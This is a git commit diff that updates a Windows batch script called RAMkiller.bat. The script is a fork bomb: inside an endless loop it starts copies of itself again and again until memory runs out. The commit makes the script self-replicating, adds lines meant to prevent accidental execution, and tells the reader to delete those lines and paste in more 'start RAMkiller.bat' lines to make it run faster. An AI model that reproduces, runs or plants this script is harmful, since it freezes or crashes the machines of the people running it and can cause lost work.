b03f1f2b8c8078aea6ac79230f4bcaa0e0879a83
Tien Vu <timothyvu2002@gmail.com>
2016-12-01 13:31:15 -0500

    Update RAMkiller.bat

--- RAMkiller/RAMkiller.bat
+++ RAMkiller/RAMkiller.bat
@@ -1,19 +1,21 @@
+-=These words are not a comment, they are here to prevent accidental running (it's an issue)
+-=To make the program work faster, just copy-paste "start RAMkiller.bat" where it says to farther down
+-=You'll want to delete the lines starting with a -= to run the code
+
 title Matrix
 color 0a
 :1
 
 type RAMK.txt
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
-start Matrix.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+-=Here's where you'll want to copy-paste "start RAMkiller.bat"
 
 goto 1
 
